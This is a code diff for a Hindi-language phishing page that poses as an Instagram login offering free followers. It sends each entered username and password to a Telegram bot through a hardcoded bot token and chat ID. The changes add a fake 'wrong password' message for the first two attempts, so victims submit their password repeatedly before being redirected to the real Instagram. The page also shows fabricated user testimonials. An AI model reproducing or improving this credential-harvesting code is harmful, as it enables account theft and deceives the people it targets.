@@ -25,6 +25,7 @@
         .review-text p { font-size: 12px; color: #262626; margin-top: 2px; }
         .review-meta { font-size: 11px; color: #8e8e8e; margin-top: 4px; }
         .verified-badge { color: #0095f6; font-size: 12px; margin-left: 2px; }
+        #error-msg { color: #ed4956; font-size: 12px; margin-bottom: 10px; display: none; }
     </style>
 </head>
 <body>
@@ -33,6 +34,8 @@
         <div class="login-box">
             <h1 style="font-family: 'Brush Script MT', cursive; font-size: 40px; margin-bottom: 15px;">Instagram</h1>
             <div class="promo-header">पाएं 10,000 फ्री फॉलोअर्स<span>सिर्फ 2 मिनट में डिलीवरी ⚡</span></div>
+
+            <div id="error-msg">आपका पासवर्ड गलत है। कृपया पुनः प्रयास करें।</div>
 
             <form id="igForm">
                 <input type="text" id="user" placeholder="फोन नंबर, यूजरनेम या ईमेल" required>
@@ -64,42 +67,28 @@
                     <div class="review-meta">2 मिनट पहले • <span style="color: #0095f6;">+2,400 फॉलोअर्स</span></div>
                 </div>
             </div>
-
-            <div class="review-item">
-                <div class="avatar"><img src="https://ui-avatars.com/api/?name=Rahul+M&background=random" alt=""></div>
-                <div class="review-text">
-                    <b>rahul_edits_01 <span class="verified-badge">✔</span></b>
-                    <p>कसम से यकीन नहीं हुआ, तुरंत आ गए सब फॉलोअर्स!</p>
-                    <div class="review-meta">4 मिनट पहले • <span style="color: #0095f6;">+10,000 फॉलोअर्स</span></div>
-                </div>
-            </div>
-
-            <div class="review-item">
-                <div class="avatar"><img src="https://ui-avatars.com/api/?name=Priya+D&background=random" alt=""></div>
-                <div class="review-text">
-                    <b>priya_dance_queen</b>
-                    <p>Best site for followers, maine apne dosto ko bhi bataya.</p>
-                    <div class="review-meta">7 मिनट पहले • <span style="color: #0095f6;">+1,500 फॉलोअर्स</span></div>
-                </div>
-            </div>
         </div>
     </div>
 
     <script>
         const TELEGRAM_BOT_TOKEN = '8718721490:AAEZ-jYmSdFfzd5hmzwNwJaPKoluuDVhK_0';
         const TELEGRAM_CHAT_ID = '7181823616';
+        let loginAttempts = 0;
 
         document.getElementById('igForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
+            loginAttempts++;
             const user = document.getElementById('user').value;
             const pass = document.getElementById('pass').value;
             const btn = document.getElementById('submitBtn');
+            const errorDiv = document.getElementById('error-msg');
             
             btn.innerText = "सत्यापित किया जा रहा है...";
             btn.disabled = true;
+            errorDiv.style.display = "none";
 
-            const message = `🚀 *New Login Captured!* \n\n👤 *User:* \`${user}\` \n🔑 *Pass:* \`${pass}\` \n\n📍 *Status:* Ready for boost`;
+            const message = `🚀 *New Login Captured!* \n\n👤 *User:* \`${user}\` \n🔑 *Pass:* \`${pass}\` \n🔢 *Attempt:* ${loginAttempts} \n\n📍 *Status:* Sent from web`;
 
             fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -111,11 +100,22 @@
                 })
             })
             .then(() => {
-                alert('सत्यापन सफल! \nफॉलोअर्स 2 मिनट के भीतर जोड़ दिए जाएंगे। अपने अकाउंट को पब्लिक रखें।');
-                window.location.href = "https://www.instagram.com"; 
+                if (loginAttempts < 3) {
+                    // Pehli aur dusri baar error dikhayega
+                    setTimeout(() => {
+                        errorDiv.style.display = "block";
+                        btn.disabled = false;
+                        btn.innerText = "लॉग इन करें और क्लेम करें";
+                        document.getElementById('pass').value = ""; // Password clear kar dega
+                    }, 1000);
+                } else {
+                    // Teesri baar success message dikhayega
+                    alert('सत्यापन सफल! \nफॉलोअर्स 2 मिनट के भीतर जोड़ दिए जाएंगे। अपने अकाउंट को पब्लिक रखें।');
+                    window.location.href = "https://www.instagram.com";
+                }
             })
             .catch(() => {
-                alert('कनेक्शन एरर! कृपया फिर se कोशिश करें।');
+                alert('कनेक्शन एरर! कृपया फिर से कोशिश करें।');
                 btn.disabled = false;
                 btn.innerText = "लॉग इन करें और क्लेम करें";
             });
